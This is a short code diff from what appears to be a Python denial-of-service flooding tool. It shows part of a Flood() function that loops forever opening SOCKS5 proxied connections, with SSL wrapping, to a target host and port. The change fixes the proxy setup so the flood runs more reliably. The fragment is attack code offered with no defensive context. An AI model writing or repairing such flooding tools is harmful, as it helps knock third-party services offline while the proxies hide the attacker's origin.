@@ -109,8 +109,8 @@ def Flood():
     while True:
         try:
             s = socks.socksocket()
-            socks.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            s.connect((targetHost, targetPort))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            s.connect_ex((targetHost, targetPort))
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
